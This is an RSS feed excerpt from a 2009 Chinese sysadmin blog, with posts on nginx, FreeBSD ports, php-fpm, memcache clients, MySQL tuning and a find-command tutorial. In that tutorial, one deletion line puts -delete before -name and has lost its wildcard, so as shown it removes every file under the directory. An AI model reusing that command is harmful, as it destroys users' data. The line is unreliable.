【前言】： 编写此技术指南在于推广普及NGINX在国内的使用，更方便的帮助大家了解和掌握NGINX的一些使用技巧。本指南很多技巧来自于网络和工作中或网络上朋友们问我的问题.在此对网络上愿意分享的朋友们表示感谢和致意！欢迎大家和我一起丰富本技术指南提出更好的建议！请朋友们关注: http://www.linuxtone.org 技术分享社区! 互想学习共同进步!
一、 Nginx 基础知识 1、简介 Nginx (&amp;ldquo;engine x&amp;rdquo;) 是一个高性能的 HTTP 和 反向代理 服务器，也是一个 IMAP/POP3/SMTP 代理服务器。 Nginx 是由 Igor Sysoev 为俄罗斯访问量第二的 Rambler.</description>
    </item>
    
    <item>
      <title>使用 Nginx 提升网站访问速度</title>
      <link>http://example.org/2009/03/24/e4bdbfe794a8-nginx-e68f90e58d87e7bd91e7ab99e8aebfe997aee9809fe5baa6/</link>
      <pubDate>Tue, 24 Mar 2009 03:23:40 +0000</pubDate>
      
      <guid>http://example.org/2009/03/24/e4bdbfe794a8-nginx-e68f90e58d87e7bd91e7ab99e8aebfe997aee9809fe5baa6/</guid>
      <description>本文主要介绍如何在 Linux 系统上安装高性能的 HTTP 服务器 —— Nginx、并在不改变原有网站结构的条件下用 Nginx 来提升网站的访问速度。 Nginx 简介 Nginx(&amp;ldquo;engine x&amp;rdquo;) 是一个高性能的 HTTP 和 反向代理 服务器，也是一个 IMAP/POP3/SMTP 代理服务器。 Nginx是由 Igor Sysoev 为俄罗斯访问量第二的 Rambler.ru 站点开发的，它已经在该站点运行超过两年半了。 Igor 将源代码以类BSD 许可证的形式发布。尽管还是测试版，但是，Nginx 已经因为它的稳定性、丰富的功能集、示例配置文件和低系统资源的消耗而闻名了。 根据最新一期（08 年 6 月份）的 NetCraft 调查报告显示，已经有超过两百万的主机使用了 Nginx，这个数字超过了另外一个轻量级的 HTTP 服务器 lighttpd， 排名第四，并且发展迅速。下面是这份报告的前几名的报表： 产品 网站数 Apache 84,309,103
IIS 60,987,087
Google GFE 10,465,178
Unknown 4,903,174
nginx 2,125,160
Oversee 1,953,848
lighttpd 1,532,952
关于这期调查报告的更详细信息请看下面链接： http://survey.netcraft.com/Reports/200806/ 下图是最近几个月使用 Nginx 和 lighttpd 的网站数比较 图 1. 最近几个月使用 Nginx 和 lighttpd 的网站数比较 目前官方 Nginx 并不支持 Windows，您只能在包括 Linux、UNIX、BSD 系统下安装和使用； Nginx 本身只是一个 HTTP 和反向代理服务器，它无法像 Apache 一样通过安装各种模块来支持不同的页面脚本，例如 PHP、CGI 等； Nginx 支持简单的负载均衡和容错； 支持作为基本 HTTP 服务器的功能，例如日志、压缩、Byte ranges、Chunked responses、SSL、虚拟主机等等，应有尽有。 在 Linux 下安装 Nginx 为了确保能在 Nginx 中使用正则表达式进行更灵活的配置，安装之前需要确定系统是否安装有 PCRE（Perl Compatible Regular Expressions）包。您可以到 ftp://ftp.</description>
    </item>
    
    <item>
      <title>Sphinx Storage Engine in MySQL via FreeBSD Ports</title>
      <link>http://example.org/2009/03/23/sphinx-storage-engine-in-mysql-via-freebsd-ports/</link>
      <pubDate>Mon, 23 Mar 2009 16:59:55 +0000</pubDate>
      
      <guid>http://example.org/2009/03/23/sphinx-storage-engine-in-mysql-via-freebsd-ports/</guid>
      <description>系統：FreeBSD 7.1-RELEASE MySQL：5.1.30 Sphinx：0.9.8.1
mysql51-server.diff diff -Nur /usr/ports/databases/mysql51-server/Makefile mysql51-server/Makefile — /usr/ports/databases/mysql51-server/Makefile 2008-07-27 09:56:19.000000000 +0100 +++ mysql51-server/Makefile 2008-08-06 16:20:51.000000000 +0100 @@ -60,6 +60,16 @@ CONFIGURE_ARGS+=–with-collation=${WITH_COLLATION} .endif +# Sphinx Engine +.if defined(WITH_SPHINXSE) +SPHINX_PORT?= textproc/sphinxsearch +SPHINX_WRKSRC= cd ${PORTSDIR}/${SPHINX_PORT} &amp;amp;&amp;amp; ${MAKE} -V WRKSRC + +EXTRACT_DEPENDS+= ${NONEXISTENT}:${PORTSDIR}/${SPHINX_PORT}:extract +RUN_DEPENDS+= searchd:${PORTSDIR}/${SPHINX_PORT} +USE_AUTOTOOLS+= autoconf:262 automake:110 +.endif + .include .if ${ARCH} == “i386″ @@ -124,8 +134,14 @@ @${ECHO} “ BUILD_STATIC=yes Build a static version of mysqld.” @${ECHO} “ (use it if you need even more speed).</description>
    </item>
    
    <item>
      <title>[ERROR] fpm_unix_conf_wp(), line 124: please specify user and group other than root, pool &#39;default&#39;</title>
      <link>http://example.org/2009/03/23/error-fpm_unix_conf_wp-line-124-please-specify-user-and-group-other-than-root-pool-default/</link>
      <pubDate>Mon, 23 Mar 2009 16:29:35 +0000</pubDate>
      
      <guid>http://example.org/2009/03/23/error-fpm_unix_conf_wp-line-124-please-specify-user-and-group-other-than-root-pool-default/</guid>
      <description>freebsd ports 装完php-ftp 不能起动
[ERROR] fpm_unix_conf_wp(), line 124: please specify user and group other than root, pool &amp;lsquo;default&amp;rsquo;
出现些错误提示，请修改 php-fpm.conf
Unix user of processes Unix group of processes 换成
Unix user of processes &amp;lt;value name=&amp;quot;user&amp;quot;&amp;gt;www&amp;lt;/value&amp;gt; Unix group of processes &amp;lt;value name=&amp;quot;group&amp;quot;&amp;gt;www&amp;lt;/value&amp;gt; /usr/local/etc/rc.d/php-fpm start Starting php_fpm.</description>
    </item>
    
    <item>
      <title>pecl::memcache和pecl::memcached</title>
      <link>http://example.org/2009/03/23/peclmemcachee5928cpeclmemcached/</link>
      <pubDate>Mon, 23 Mar 2009 16:05:39 +0000</pubDate>
      
      <guid>http://example.org/2009/03/23/peclmemcachee5928cpeclmemcached/</guid>
      <description>原文地址：http://www.surfchen.org/?p=371
终于，基于libmemached的php扩展在pecl发布了。
于是，现在pecl上有两个memcache客户端了。一个是完全在PHP框架内开发的memcache，一个是使用libmemcached的memecached。
功能嘛，我没看过libmemcached，但是理论上来说，在其他语言里已经很流行的libmemcached应该会有更完善的功能。而程序上性能（内存和CPU使用率），不好说，虽然pecl::memcache是原生实现的，但是使用libmemcached的pecl::memached只支持OO接口，而pecl::memcache则是OO和非OO两套接口并存，这点拖累了它。
其实这些都不是最重要的。使用libmemcached有个明显的优点，就是以后随着memcached服务器端的改进，这个lib也必定会马上跟进的。而pecl::memcache却不一定能做到按时跟进。
pecl::memcached，还有个非常称赞的地方，就是flag不是在操作的时候设置了。而是有一个统一的setOption()。冲着这个方法，就非常值得从pecl::memcache转到pecl::memcached了。具体的接口可以看这里：http://cvs.php.net/viewvc.cgi/pecl/memcached/memcached-api.php?view=markup
我在pecl-dev@里提到是否可以做成driver-based的架构。跟现在的MySQL一样，可以选择使用mysqlnd或者libmysql作为底层的引擎。但是之后想想，其实我并不是很支持对memcached使用这样的架构，它和MySQL的情况不一样。
mysqlnd作为一个引擎而不是一个新的api来开发，可以使得大量的应用程序不需要对数据库操作做修改即可用上新的引擎。如果mysqlnd作为一个新的extension，那么如果它想兼容以前的程序，就面临一个很困难的选择。因为目前为止，存在3个官方的使用libmysql的，并具有不同对外接口的MySQL类集。mysqlnd能兼容mysql，就无法兼容mysqli或者pdo。当然对于使用自己的抽象数据库类的程序来说，这个可以通过改写类或者更换driver(php层面)来实现兼容。但是要想想，就算是使用抽象库，这个世界如此之多的数据库抽象库，如果要让所有人都用得起nd，那得改多少个库，加多少个driver阿。
memcached的情况就简单很多了，目前和官方关系比较密切的只有pecl::memcache，而且接口基本上都是根据memcached的协议来的，和libmemcache相差无几。它们其实都可以被看作是一个抽象类里的不同driver。所以虽然是两套不同的客户端，但是更换起来，几乎不需要做什么改动，只需要在类初始化的地方更改一下，set/get等等这些方法的flag去掉即可，除非你使用了非OO的接口。
另外mysql在通讯和数据获取上也比memcache复杂，nd可以做到一些libmysql无法做到的事情。例如buffer可以直接用php内部的HashTable和zval存储；再例如一些作为持久链接的结构可以更多地缓存起来。(这些例如只是我的猜测，我并没有去阅读过mysqlnd的代码)
相关文章：
pecl上有三个memcached客户端了 pecl::memcache的哈希策略 影响memcached性能的事件提醒机制</description>
    </item>
    
    <item>
      <title>nginx源代码分析</title>
      <link>http://example.org/2009/03/23/nginxe6ba90e4bba3e7a081e58886e69e90/</link>
      <pubDate>Mon, 23 Mar 2009 15:07:27 +0000</pubDate>
      
      <guid>http://example.org/2009/03/23/nginxe6ba90e4bba3e7a081e58886e69e90/</guid>
      <description>Nginx可以开启多个进程，每个进程拥有最大上限128个子线程以及一定的可用连接数。如果你希望使用线程可以在配置文件中设置worker_threads这个参数，但这个参数在Nginx官方手册上没有。只有通过阅读源代码才看到。最大客户端连接数等于进程数与连接数的乘积，连接是在主进程中初始化的，一开始所有连接处于空闲状态。
每一个客户端请求进来以后会通过事件处理机制，在Linux是Epoll，在FreeBSD下是KQueue放到空闲的连接里。
如果设置了线程数，那么被填充的连接会在子线程中处理，否则会在主线程中依次处理。
如果解析出是动态脚本请求，会根据fast-cgi的设置访问php-cgi进程，php进程数量的多少依据php-fpm.conf中max_children的设置。
因此Nginx的动态请求能力不仅仅依靠Nginx本身的设置，还要调试php-fpm。
从源代码级别上看nginx由以下几个元素组成：
1. worker（进程） 2. thread（线程） 3. connection（连接） 4. event（事件） 5. module（模块） 6. pool（内存池） 7. cycle（全局设置） 8. log（日志） 大概就这些元素组成的。 整个程序从main()开始算 ngx_max_module = 0; for (i = 0; ngx_modules[i]; i++) { ngx_modules[i]-&amp;gt;index = ngx_max_module++; } 这几句比较关键，对加载的模块点一下数，看有多少个。ngx_modules并不是在原代码中被赋值的，你先执行一下./configure命令生成用于编译的make环境。在根目录会多出来一个文件夹objs，找到ngx_modules.c文件，默认情况下nginx会加载大约30个模块，的确不少，如果你不需要那个模块尽量还是去掉好一些。 接下来比较重要的函数是 ngx_init_cycle()，这个函数初始化系统的配置以及网络连接等，如果是多进程方式加载的会继续调用ngx_master_process_cycle()，这是main函数中调用的最关键的两个函数。 ngx_init_cycle()实际上是个复杂的初始化函数，首先是加载各子模块的配置信息、并初始化各组成模块。 任何模块都有两个重要接口组成，一个是create_conf，一个是init_conf。分别是创建配置和初始化配置信息。 模块按照先后顺序依次初始化，大概是这样的： &amp;amp;ngx;_core_module, &amp;amp;ngx;_errlog_module, &amp;amp;ngx;_conf_module, &amp;amp;ngx;_events_module, &amp;amp;ngx;_event_core_module, &amp;amp;ngx;_epoll_module, &amp;amp;ngx;_http_module, &amp;amp;ngx;_http_core_module, &amp;amp;ngx;_http_log_module, 首先是内核模块、错误日志、配置模块、事件模块、时间内核模块、EPOLL模块、http模块、http内核模块、http日志模块，剩下的模块都算不上关键。 epoll是比较关键的核心模块之一，nginx兼容多种IO控制模型，memecached用的是libevent不如nginx彻头彻尾是自己实现的。 在ngx_init_cycle()中对模块初始化完毕后，调用ngx_open_listening_sockets()函数对socket进行了初始化。 在listen上80端口以后，调用模块的另外一个重要接口init_module对各模块进行初始化。 并不是每个模块都对init_module接口进行了定义，在比较重要的模块中仅有 ngx_http_log_module 对这个接口进行了定义。 ngx_init_cycle()返回后，主要的工作都是在ngx_master_process_cycle()函数中继续进行的。 ngx_master_process_cycle()函数中的重要过程有调用ngx_start_worker_processes()生成多个子进程，一般nginx是多进程的。 ngx_start_worker_processes()函数内部调用ngx_worker_process_cycle()函数建立每个进程的实际工 作内容，在这个函数中首先调用ngx_create_thread()初始化各线程。我们知道每个线程都有一个启动处理函数，nginx的线程处理函数为 ngx_worker_thread_cycle()，内部过程中最重要的是对ngx_event_thread_process_posted()函数 的调用，用于实际处理每一次请求。 在初始化线程结束后，首先调用ngx_process_events_and_timers()函数，该函数继续调用 ngx_process_events接口监听事件，一般情况下对应的函数是ngx_epoll_process_events()，如果使用的是其它种 类的IO模型，则应该实现相应的实际函数。这个接口负责把事件投递到ngx_posted_events事件队列里，并在 ngx_event_thread_process_posted()函数中进行处理。 nginx的connection和event是按照链表的方式进行存放的，区别在于connection是单向链表而event是双向链表。 nginx中的connection链表是提前分配的，定义在ngx_event_process_init()函数内，具体代码如下： .</description>
    </item>
    
    <item>
      <title>Linux基金会本周买下Linux.com域名</title>
      <link>http://example.org/2009/03/21/linuxe59fbae98791e4bc9ae69cace591a8e4b9b0e4b88blinuxcome59f9fe5908d/</link>
      <pubDate>Sat, 21 Mar 2009 16:03:47 +0000</pubDate>
      
      <guid>http://example.org/2009/03/21/linuxe59fbae98791e4bc9ae69cace591a8e4b9b0e4b88blinuxcome59f9fe5908d/</guid>
      <description>Linux基金会本周买下了Linux.com域名,将把它建设为Linux用户和开发者的活跃社区,有分析人士认为,Linux基金会此举是为了吸引更多的商业用户使用Linux操作系统.
Linux.com之前只是一个简单的新闻站点,去年的访问量上升了21%.目前Linux基金会正在准备重新发布新网站,预计新网站将在数月之内上线.SourceFourge也表示将继续销售Linux.com的推广广告来支持Linux基金会.
Linux基金会还计划把当前的www.linuxfoundation.org网站上内容与社区项目都移植到新网站,并向商业用户提供更多有关使用Linux的信息,以吸引更多的商业用户使用Linux这样的开源操作系统.
Linux基金会执行主管吉姆·泽姆林(Jim Zemlin)表示,“能够得到Linux.com这个域名并通过它为用户提供信息与服务,Linux社区感到非常兴奋.我们将向世人展示Linux社区成员是如何通过Linux.com网站进行协作的.”</description>
    </item>
    
    <item>
      <title>web 2.0系统的Cache化</title>
      <link>http://example.org/2009/03/21/web-20e7b3bbe7bb9fe79a84cachee58c96/</link>
      <pubDate>Sat, 21 Mar 2009 15:23:16 +0000</pubDate>
      
      <guid>http://example.org/2009/03/21/web-20e7b3bbe7bb9fe79a84cachee58c96/</guid>
      <description>已经有很久了。几位同事不断的跟我谈论着做静态化内容的改造。由于我们系统和用户的增涨过快，大量的web 2.0产品都面临着用户的增涨过快，极大的消耗了服务器资源。当年的三板斧的静态化板斧又冲上来了。但是显然，将一个动态的web 2.0系统做成一个静态化的系统，不是一天两天的事，但我认为大量的人力资源消耗在这件事上显然不值得。这里记下自己尝试着需要记录的为动态加入 Cache功能的要点。
先来看看新浪的blog首页和我的页面：
访问http://blog.sina.com.cn的首页，它返回的Header如下： HTTP/1.1 200 OK Date: Mon, 09 Jul 2007 11:26:19 GMT Server: Apache/1.3.37 (Unix) Cache-Control: max-age=600 Expires: Mon, 09 Jul 2007 11:36:19 GMT Last-Modified: Mon, 09 Jul 2007 11:15:11 GMT ETag: &amp;ldquo;451ed-4d003-469218bf&amp;rdquo; Accept-Ranges: bytes Content-Length: 315395 Content-Type: text/html
访问http://blog.sina.com.cn/hdcola，它返回的Header如下： HTTP/1.1 200 OK Date: Mon, 09 Jul 2007 11:28:01 GMT Server: Apache/1.3.37 (Unix) Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Expires: Thu, 19 Nov 1981 08:52:00 GMT Set-Cookie: SessionID=xxxxxxxxxxxxxxxxxx; path=/ Pragma: no-cache Transfer-Encoding: chunked Content-Type: text/html</description>
    </item>
    
    <item>
      <title>IBM欲斥资65亿美元收购Sun 同时涉足Linux和Unix</title>
      <link>http://example.org/2009/03/21/ibme6acb2e696a5e8b58465e4babfe7be8ee58583e694b6e8b4adsun-e5908ce697b6e6b689e8b6b3linuxe5928cunix/</link>
      <pubDate>Sat, 21 Mar 2009 14:57:58 +0000</pubDate>
      
      <guid>http://example.org/2009/03/21/ibme6acb2e696a5e8b58465e4babfe7be8ee58583e694b6e8b4adsun-e5908ce697b6e6b689e8b6b3linuxe5928cunix/</guid>
      <description>华尔街日报周三发表文章称，消息人士透露，IBM欲斥资65亿美元收购Sun，该交易最早将于本周宣布。但业内人士认为，这一消息并不出乎意料。并列出了IBM收购Sun的9大积极因素。Sun 在金融和通信等关键领域的硬件市场仍然占据很大的份额。Sun对美国市场非常依赖，但现在看来，这一市场的情况不容乐观。
1、IBM提升服务器和存储器市场
随着思科进入服务器市场，这一领 域的利润率也将受到挤压，尤其是当服务器增加了存储器和网络设备的功能后。而被并购后，由于IBM规模更大，因此能够承受较小的利润率。存储器市场也是如 此。
当然，双方还存在一些问题需要调和。IBM已经撤出了商品服务器（commodity server）市场，而Sun仍然涉足这一市场。与此同时，两家公司的服务器所使用的芯片也有所不同，Sun使用的是Sparc处理器，而IBM则是基于Power架构。
2、通过硬件增强软件业务
IBM是一家软件和服务公司，但是它同样需要硬件以销售其他产品。硬件是IBM所提供的软件及服务的入口。如果能够增强硬件业务，就可以在这一市场上更好的防御惠普。
3、横跨Linux和Unix两大市场
Sun 是Unix领域的重要厂商，旗下的Solaris至今仍是非常重要的平台，但是其市场近期却没有太大进展。IBM收购Sun后可以建立两大阵地：Linux和Unix。前者最终会在数据中心市场代替后者。IBM可以同时涉足两个领域，并对用户出售相关的服务以实现平台之间的迁移。除此之外，收购Sun还能对惠普的Unix业务形成一定的压力。
不过这里同样存在一个问题，IBM出售的是AIX Unix服务器，而Sun出售的则是Solaris服务器。
4、Sun可借此解脱
Sun希望从一家传统的硬件公司转型为一家开源软件和服务企业。这一举措恐怕难以奏效。而此时选择放弃则是明智之举。除此之外，此前还有报道称Sun曾被惠普和戴尔拒绝过。
5、回击惠普
《华尔街日报》的文章认为IBM此举是为应对思科进军数据中心业务。事实上，IBM真正的目标在于惠普。通过收购EDS，惠普将矛头直接指向IBM。而IBM则可凭借收购Sun在硬件领域给予惠普以有力的回击。
6、整合开源软件
Sun 的未来是以MySQL为核心推出一系列开源软件。而IBM也在大力拓展开源市场。因此两家公司的合并就在情理之中，而且IBM还可借此将MySQL、 Lotus、OpenSolaris和其他产品整合到一起。另外，Sun的开源软件需要分销渠道，因此它最近刚刚与惠普签署了分销协议。而IBM恰好拥有丰富的分销渠道。
面临问题：双方有许多重叠的软件。例如，在数据库领域IBM有DB2而Sun有MySQL。
7、使Java盈利
一直以来，Java都被认为是Sun最为优秀的资产，但这一平台从未实现盈利。或许IBM有能力帮助Java盈利。
8、丰富云计算服务
Sun在云计算领域有着一些非常有趣的想法其计划也切实可行。Sun还在云计算领域进行了一些有针对性的并购。而IBM则可以通过并购将Sun的这些计划纳入到其庞大的云计算计划中。
9、平衡数据中心市场格局
数据中心的管理人员都希望能够尽量少的出现瓶颈，而思科的产品则希望简化数据中心的管理。在思科进军该领域后，IBM对Sun的并购又可以使市场重新获得平衡。
垄断问题和文化差异 不 过，双方的交易可能会面临反垄断审查。根据美国市场研究公司IDC的数据，2008年全年，IBM和Sun分列服务器市场第一和第四位，份额分别为 31.9%和10.13%，合并后份额则达到42%。惠普和戴尔分列二、三，份额分别为29.5%和11.6%。IBM和Sun的交易能否通过政府审查还是个未知数。除此之外，双方还存在这相当的文化差异。
原文 http://bbs2.chinaunix.net/thread-1400664-1-1.html</description>
    </item>
    
    <item>
      <title>QQ 批量查询显示状态 js!</title>
      <link>http://example.org/2009/03/19/qq-e689b9e9878fe69fa5e8afa2e698bee7a4bae78ab6e68081-js/</link>
      <pubDate>Thu, 19 Mar 2009 18:31:19 +0000</pubDate>
      
      <guid>http://example.org/2009/03/19/qq-e689b9e9878fe69fa5e8afa2e698bee7a4bae78ab6e68081-js/</guid>
      <description>&amp;lt;script src=&amp;quot;http://webpresence.qq.com/getonline?Type=1&amp;amp;669811:1026811:65861413:&amp;quot;&amp;gt;&amp;lt;/script&amp;gt; 调用
&amp;lt;script&amp;gt;line(online[0],&#39;白天&#39;,669811)&amp;lt;/script&amp;gt; 效果页面见 http://cd-dns.com/freebsd-hosting
不过现在已经被TX禁了,找个时间在重写一下吧</description>
    </item>
    
    <item>
      <title>PHP 5.2.9 Released!</title>
      <link>http://example.org/2009/03/19/php-529-released/</link>
      <pubDate>Thu, 19 Mar 2009 14:36:17 +0000</pubDate>
      
      <guid>http://example.org/2009/03/19/php-529-released/</guid>
      <description>Security Enhancements and Fixes in PHP 5.2.9:
Fixed security issue in imagerotate(), background colour isn’t validated correctly with a non truecolour image. Reported by Hamid Ebadi, APA Laboratory (Fixes CVE-2008-5498). (Scott) Fixed a crash on extract in zip when files or directories entry names contain a relative path. (Pierre) Fixed explode() behavior with empty string to respect negative limit. (Shire) Fixed a segfault when malformed string is passed to json_decode(). (Scott) </description>
    </item>
    
    <item>
      <title>Find 指令用法教學</title>
      <link>http://example.org/2009/03/19/find-e68c87e4bba4e794a8e6b395e69599e5adb8/</link>
      <pubDate>Thu, 19 Mar 2009 13:47:18 +0000</pubDate>
      
      <guid>http://example.org/2009/03/19/find-e68c87e4bba4e794a8e6b395e69599e5adb8/</guid>
      <description>筆記一下自己常用的 find 指令，適用於 FreeBSD 或者是 Linux 各大 distribution，系統管理這個指令就相當重要了，在搭配 grep，sed，awk，perl 可以快速找到自己要的檔案。我自己本身很常用到 grep，find，awk 這些撰寫 shell script。
底下先來介紹一下 find：
找出 . 底下的 php 檔案
find . -name &amp;ldquo;*.php&amp;rdquo;
找出 . 底下非 php 副檔名檔案
find . -not -name &amp;ldquo;*.php&amp;rdquo;
刪除 . 底下 php 檔案，有兩種作法
系統詢問之後才刪除 先把 -exec 後面的東西先清掉， 用 -print 來先確認輸出 rm 可以多用 -i 的參數來加以確認 find . -name &amp;ldquo;*.php&amp;rdquo; -exec rm -i {} ;
系統直接刪除 find . -delete -name &amp;ldquo;.php&amp;rdquo; find . -name &amp;ldquo;.php&amp;rdquo; | xargs /bin/rm -rf</description>
    </item>
    
    <item>
      <title>利用 portmaster 升級 PHP 5.26 -&gt; 5.28</title>
      <link>http://example.org/2009/03/19/e588a9e794a8-portmaster-e58d87e7b49a-php-526-528/</link>
      <pubDate>Thu, 19 Mar 2009 13:12:10 +0000</pubDate>
      
      <guid>http://example.org/2009/03/19/e588a9e794a8-portmaster-e58d87e7b49a-php-526-528/</guid>
      <description>之前在 大神 那边看到一篇 升级 PHP 5.2.8 的一些小细节，就来把我的机器升级一下，发现 php 5.2.7 之后已经把 pcre extension 纳入在裡面，参考 /usr/ports/UPDATING 裡面的 20081211 这个项目，可以利用 portupgrade 或者是 portmaster 来升级，之前都是利用 ruby 写的 portupgrade 来升级系统或者是更新安全性，现在利用 portmaster 这一套也是不错用，portmaster 是用 sh 写出来的，在 gslin 大神这一篇：portupgrade、portmaster、portconf 说到速度方面比 portupgrade 还要好，这我没有实际测试过，自己在实际用了一下，还蛮方便的。
安装 portmaster 跟 portconf 搭配：
cd /usr/ports/ports-mgmt/portconf make install clean cd /usr/ports/ports-mgmt/portmaster make install clean 先找出需要升级的套件：
pkg_version -v 在利用 portmaster 升级 php5
pkg_delete -f php5-pcre\* portmaster pecl\* portmaster php5\* 如果是利用 portupgrade：
pkg_delete -f php5-pcre-* pkgdb -F portupgrade -f php5* portupgrade -f pecl* 之前还没升级的时候，利用 portaudit 检查套件的安全性，发现 php5-gd 在 5.</description>
    </item>
    
    <item>
      <title>软件开发版本及区别</title>
      <link>http://example.org/2009/03/18/e8bdafe4bbb6e5bc80e58f91e78988e69cace58f8ae58cbae588ab/</link>
      <pubDate>Wed, 18 Mar 2009 11:49:49 +0000</pubDate>
      
      <guid>http://example.org/2009/03/18/e8bdafe4bbb6e5bc80e58f91e78988e69cace58f8ae58cbae588ab/</guid>
      <description>alpha 内部测试版 beta 外部测试版 demo 演示版 Enhance 增强版或者加强版 属于正式版 Free 自由版 Full version 完全版 属于正式版 shareware 共享版 Release 发行版 有时间限制 Upgrade 升级版 Retail 零售版 Cardware 属共享软件的一种，只要给作者回复一封电邮或明信片即可。（有的作者并由此提供注册码等），目前这种形式已不多见。 Plus 属增强版，不过这种大部分是在程序界面及多媒体功能上增强。 Preview 预览版 Corporation &amp;amp; Enterprise 企业版 Standard 标准版 Mini 迷你版也叫精简版只有最基本的功能 Premium — 贵价版 Professional — 专业版 Express — 特别版 Deluxe — 豪华版 Regged — 已注册版 CN — 简体中文版 CHT — 繁体中文版 EN — 英文版 Multilanguage — 多语言版
α版 此版本表示该软件仅仅是一个初步完成品，通常只在软件开发者内部交流，也有很少一部分发布给专业测试人员。一般而言，该版本软件的 bug 较多，普通用户最好不要安装。
β（beta）版 该版本相对于α版已有了很大的改进，消除了严重的错误，但还是存在着一些缺陷，需要经过大规模的发布测试来进一步消除。这一版本通常由软件公司免费发布，用户可从相关的站点下载。通过一些专业爱好者的测试，将结果反馈给开发者，开发者们再进行有针对性的修改。该版本也不适合一般用户安装。</description>
    </item>
    
    <item>
      <title>MySQL分表优化试验</title>
      <link>http://example.org/2009/03/18/mysqle58886e8a1a8e4bc98e58c96e8af95e9aa8c/</link>
      <pubDate>Wed, 18 Mar 2009 10:11:18 +0000</pubDate>
      
      <guid>http://example.org/2009/03/18/mysqle58886e8a1a8e4bc98e58c96e8af95e9aa8c/</guid>
      <description>我们的项目中有好多不等于的情况。今天写这篇文章简单的分析一下怎么个优化法。 这里的分表逻辑是根据t_group表的user_name组的个数来分的。 因为这种情况单独user_name字段上的索引就属于烂索引。起不了啥名明显的效果。
1、试验PROCEDURE. DELIMITER $$ DROP PROCEDURE `t_girl`.`sp_split_table`$$ CREATE PROCEDURE `t_girl`.`sp_split_table`() BEGIN declare done int default 0; declare v_user_name varchar(20) default &#39;&#39;; declare v_table_name varchar(64) default &#39;&#39;; -- Get all users&#39; name. declare cur1 cursor for select user_name from t_group group by user_name; -- Deal with error or warnings. declare continue handler for 1329 set done = 1; -- Open cursor. open cur1; while done &amp;lt;&amp;gt; 1 do fetch cur1 into v_user_name; if not done then -- Get table name.</description>
    </item>
    
    <item>
      <title>转： 关于MySQL的查询缓存</title>
      <link>http://example.org/2009/03/18/e8bdacefbc9a-e585b3e4ba8emysqle79a84e69fa5e8afa2e7bc93e5ad98/</link>
      <pubDate>Wed, 18 Mar 2009 04:52:48 +0000</pubDate>
      
      <guid>http://example.org/2009/03/18/e8bdacefbc9a-e585b3e4ba8emysqle79a84e69fa5e8afa2e7bc93e5ad98/</guid>
      <description>最近发现用户注册老是出错,不确定问题所在,不知道是不是SQL CACHE引起的,
原理 QueryCache(下面简称QC)是根据SQL语句来cache的。一个SQL查询如果以select开头，那么MySQL服务器将尝试对其使用 QC。每个Cache都是以SQL文本作为key来存的。在应用QC之前，SQL文本不会被作任何处理。也就是说，两个SQL语句，只要相差哪怕是一个字符（例如大小写不一样；多一个空格等），那么这两个SQL将使用不同的一个CACHE。
不过SQL文本有可能会被客户端做一些处理。例如在官方的命令行客户端里，在发送SQL给服务器之前，会做如下处理： 过滤所有注释 去掉SQL文本前后的空格,TAB等字符。注意，是文本前面和后面的。中间的不会被去掉。
下面的三条SQL里，因为SELECT大小写的关系，最后一条和其他两条在QC里肯定是用的不一样的存储位置。而第一条和第二条，区别在于后者有个注释，在不同客户端，会有不一样的结果。所以，保险起见，请尽量不要使用动态的注释。在PHP的mysql扩展里，SQL的注释是不会被去掉的。也就是三条 SQL会被存储在三个不同的缓存里，虽然它们的结果都是一样的。
select * FROM people where name=&#39;surfchen&#39;; select * FROM people where /*hey~*/name=&#39;surfchen&#39;; SELECT * FROM people where name=&#39;surfchen&#39;; 目前只有select语句会被cache，其他类似show,use的语句则不会被cache。 因为QC是如此前端，如此简单的一个缓存系统，所以如果一个表被更新，那么和这个表相关的SQL的所有QC都会被失效。假设一个联合查询里涉及到了表A和表B，如果表A或者表B的其中一个被更新（update或者delete），这个查询的QC将会失效。 也就是说，如果一个表被频繁更新，那么就要考虑清楚究竟是否应该对相关的一些SQL进行QC了。一个被频繁更新的表如果被应用了QC，可能会加重数据库的负担，而不是减轻负担。我一般的做法是默认打开QC，而对一些涉及频繁更新的表的SQL语句加上SQL_NO_CACHE关键词来对其禁用CACHE。这样可以尽可能避免不必要的内存操作，尽可能保持内存的连续性。 那些查询很分散的SQL语句，也不应该使用QC。例如用来查询用户和密码的语句——“select pass from user where name=&#39;surfchen&#39;”。这样的语句，在一个系统里，很有可能只在一个用户登陆的时候被使用。每个用户的登陆所用到的查询，都是不一样的SQL 文本，QC在这里就几乎不起作用了，因为缓存的数据几乎是不会被用到的，它们只会在内存里占地方。 存储块 在本节里“存储块”和“block”是同一个意思 QC缓存一个查询结果的时候，一般情况下不是一次性地分配足够多的内存来缓存结果的。而是在查询结果获得的过程中，逐块存储。当一个存储块被填满之后，一个新的存储块将会被创建，并分配内存（allocate）。单个存储块的内存分配大小通过query_cache_min_res_unit参数控制，默认为4KB。最后一个存储块，如果不能被全部利用，那么没使用的内存将会被释放。如果被缓存的结果很大，那么会可能会导致分配内存操作太频繁，系统系能也随之下降；而如果被缓存的结果都很小，那么可能会导致内存碎片过多，这些碎片如果太小，就很有可能不能再被分配使用。 除了查询结果需要存储块之外，每个SQL文本也需要一个存储块，而涉及到的表也需要一个存储块（表的存储块是所有线程共享的，每个表只需要一个存储块）。存储块总数量=查询结果数量*2+涉及的数据库表数量。也就是说，第一个缓存生成的时候，至少需要三个存储块：表信息存储块，SQL文本存储块，查询结果存储块。而第二个查询如果用的是同一个表，那么最少只需要两个存储块：SQL文本存储块，查询结果存储块。 通过观察Qcache_queries_in_cache和Qcache_total_blocks可以知道平均每个缓存结果占用的存储块。它们的比例如果接近1:2，则说明当前的query_cache_min_res_unit参数已经足够大了。如果Qcache_total_blocks比 Qcache_queries_in_cache多很多，则需要增加query_cache_min_res_unit的大小。 Qcache_queries_in_cache*query_cache_min_res_unit（sql文本和表信息所在的block占用的内存很小，可以忽略）如果远远大于query_cache_size-Qcache_free_memory，那么可以尝试减小 query_cache_min_res_unit的值。 调整大小 如果Qcache_lowmem_prunes增长迅速，意味着很多缓存因为内存不够而被释放，而不是因为相关表被更新。尝试加大query_cache_size，尽量使Qcache_lowmem_prunes零增长。 启动参数 show variables like &#39;query_cache%&#39;可以看到这些信息。 query_cache_limit:如果单个查询结果大于这个值，则不Cache query_cache_size:分配给QC的内存。如果设为0，则相当于禁用QC。要注意QC必须使用大约40KB来存储它的结构，如果设定小于 40KB,则相当于禁用QC。QC存储的最小单位是1024 byte，所以如果你设定了一个不是1024的倍数的值，这个值会被四舍五入到最接近当前值的等于1024的倍数的值。 